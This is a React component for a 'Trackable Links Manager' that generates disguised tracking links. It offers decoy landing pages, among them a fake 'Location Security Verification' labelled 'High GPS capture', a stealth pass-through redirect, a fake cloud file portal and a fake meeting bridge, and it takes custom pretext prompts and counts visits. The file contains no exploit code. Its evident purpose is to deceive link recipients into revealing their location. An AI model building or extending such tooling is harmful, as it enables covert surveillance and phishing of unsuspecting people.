import React, { useState } from 'react';
import { TrackingLink } from '../types/tracker';
import {
  X,
  Plus,
  Link as LinkIcon,
  Copy,
  Check,
  ExternalLink,
  Trash2,
  ShieldCheck,
  FileText,
  Video,
  Zap,
} from 'lucide-react';

interface LinkManagerModalProps {
  links: TrackingLink[];
  onClose: () => void;
  onCreateLink: (link: {
    title: string;
    targetUrl: string;
    customSlug?: string;
    decoyType: 'instant' | 'verify' | 'cloud_file' | 'meeting' | 'status';
    customPromptMessage?: string;
  }) => Promise<void>;
  onDeleteLink: (id: string) => Promise<void>;
  onTestOpener: (link: TrackingLink) => void;
}

export const LinkManagerModal: React.FC<LinkManagerModalProps> = ({
  links,
  onClose,
  onCreateLink,
  onDeleteLink,
  onTestOpener,
}) => {
  const [isCreating, setIsCreating] = useState(false);
  const [title, setTitle] = useState('');
  const [targetUrl, setTargetUrl] = useState('');
  const [customSlug, setCustomSlug] = useState('');
  const [decoyType, setDecoyType] = useState<'instant' | 'verify' | 'cloud_file' | 'meeting' | 'status'>('verify');
  const [customPromptMessage, setCustomPromptMessage] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  const getFullTrackUrl = (slug: string) => {
    const origin = window.location.origin;
    return `${origin}/?t=${slug}`;
  };

  const handleCopyLink = (slug: string, id: string) => {
    const url = getFullTrackUrl(slug);
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!title.trim() || !targetUrl.trim()) return;

    try {
      setSubmitting(true);
      await onCreateLink({
        title: title.trim(),
        targetUrl: targetUrl.trim(),
        customSlug: customSlug.trim() || undefined,
        decoyType,
        customPromptMessage: customPromptMessage.trim() || undefined,
      });
      setTitle('');
      setTargetUrl('');
      setCustomSlug('');
      setCustomPromptMessage('');
      setIsCreating(false);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-3xl max-h-[90vh] overflow-y-auto bg-slate-900 border border-slate-700 rounded-2xl shadow-2xl text-slate-100 flex flex-col">
        {/* Header */}
        <div className="sticky top-0 z-10 flex items-center justify-between px-6 py-4 bg-slate-900/95 backdrop-blur-md border-b border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30">
              <LinkIcon className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-white">Trackable Links Manager</h3>
              <p className="text-xs text-slate-400">
                Generate tracking links with decoy landing pages or instant pass-through redirects
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6 space-y-6">
          {/* Top Actions */}
          <div className="flex items-center justify-between">
            <span className="text-sm font-semibold text-slate-300">
              Active Tracking Links ({links.length})
            </span>
            {!isCreating && (
              <button
                onClick={() => setIsCreating(true)}
                className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-white font-semibold rounded-xl text-xs shadow-lg shadow-cyan-500/20 transition-all active:scale-95"
              >
                <Plus className="w-4 h-4" />
                <span>Create New Tracker Link</span>
              </button>
            )}
          </div>

          {/* Creation Form */}
          {isCreating && (
            <form
              onSubmit={handleSubmit}
              className="p-5 bg-slate-950 rounded-2xl border border-cyan-500/40 shadow-xl space-y-4 animate-in slide-in-from-top-4 duration-200"
            >
              <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                <span className="text-xs font-bold uppercase tracking-wider text-cyan-400">
                  New Tracking Link Config
                </span>
                <button
                  type="button"
                  onClick={() => setIsCreating(false)}
                  className="text-xs text-slate-400 hover:text-white"
                >
                  Cancel
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Campaign / Link Title *
                  </label>
                  <input
                    type="text"
                    required
                    value={title}
                    onChange={(e) => setTitle(e.target.value)}
                    placeholder="e.g. Executive Proposal PDF"
                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Destination Redirect URL *
                  </label>
                  <input
                    type="url"
                    required
                    value={targetUrl}
                    onChange={(e) => setTargetUrl(e.target.value)}
                    placeholder="https://docs.google.com/... or https://..."
                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Custom Slug / Alias (Optional)
                  </label>
                  <div className="flex items-center">
                    <span className="px-2.5 py-2 bg-slate-800 border border-r-0 border-slate-700 rounded-l-xl text-slate-400 font-mono text-[11px]">
                      ?t=
                    </span>
                    <input
                      type="text"
                      value={customSlug}
                      onChange={(e) => setCustomSlug(e.target.value)}
                      placeholder="e.g. project-specs-2026"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-r-xl text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Opener Landing Page / Decoy
                  </label>
                  <select
                    value={decoyType}
                    onChange={(e) => setDecoyType(e.target.value as unknown as typeof decoyType)}
                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-100 focus:outline-none focus:border-cyan-500"
                  >
                    <option value="verify">Location Security Verification (High GPS capture)</option>
                    <option value="instant">Instant Stealth Pass-Through (Direct Redirect)</option>
                    <option value="cloud_file">Cloud File Download Portal</option>
                    <option value="meeting">Video Meeting Waiting Bridge</option>
                  </select>
                </div>
              </div>

              {decoyType === 'verify' && (
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Custom Decoy Prompt Message
                  </label>
                  <input
                    type="text"
                    value={customPromptMessage}
                    onChange={(e) => setCustomPromptMessage(e.target.value)}
                    placeholder="e.g. Verify location identity to decrypt document cache..."
                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500"
                  />
                </div>
              )}

              <div className="flex justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setIsCreating(false)}
                  className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs font-semibold"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="px-5 py-2 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-xl text-xs shadow-lg shadow-cyan-500/20 disabled:opacity-50"
                >
                  {submitting ? 'Generating...' : 'Save & Generate Link'}
                </button>
              </div>
            </form>
          )}

          {/* Links List */}
          <div className="space-y-3">
            {links.map((link) => {
              const fullUrl = getFullTrackUrl(link.slug);
              return (
                <div
                  key={link.id}
                  className="p-4 bg-slate-950/80 rounded-xl border border-slate-800 hover:border-slate-700 transition-all flex flex-col md:flex-row md:items-center justify-between gap-4"
                >
                  <div className="space-y-1.5 flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="font-bold text-sm text-white truncate">{link.title}</span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-slate-800 text-cyan-300 border border-slate-700">
                        {link.decoyType}
                      </span>
                      <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-emerald-950/80 text-emerald-400 border border-emerald-800/60">
                        {link.visitsCount} visits
                      </span>
                    </div>

                    {/* URL Bar */}
                    <div className="flex items-center gap-2 max-w-xl">
                      <div className="flex-1 px-3 py-1 bg-slate-900 border border-slate-800 rounded-lg font-mono text-[11px] text-cyan-300 truncate">
                        {fullUrl}
                      </div>
                      <button
                        onClick={() => handleCopyLink(link.slug, link.id)}
                        className="px-3 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white rounded-lg text-xs flex items-center gap-1 font-medium transition-colors"
                      >
                        {copiedId === link.id ? (
                          <>
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                            <span className="text-emerald-400">Copied</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3.5 h-3.5 text-slate-400" />
                            <span>Copy</span>
                          </>
                        )}
                      </button>
                    </div>

                    <div className="text-[11px] text-slate-500 truncate">
                      <span>Redirects to: </span>
                      <span className="text-slate-400">{link.targetUrl}</span>
                    </div>
                  </div>

                  {/* Right Action buttons */}
                  <div className="flex items-center gap-2 shrink-0">
                    <button
                      onClick={() => onTestOpener(link)}
                      className="px-3 py-1.5 bg-cyan-950/80 hover:bg-cyan-900 text-cyan-300 border border-cyan-800/80 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-colors"
                      title="Open link in test mode to simulate and verify tracking"
                    >
                      <Zap className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Test Opener</span>
                    </button>

                    <button
                      onClick={() => onDeleteLink(link.id)}
                      className="p-2 text-slate-400 hover:text-rose-400 hover:bg-rose-950/30 rounded-xl transition-colors"
                      title="Delete link"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
};
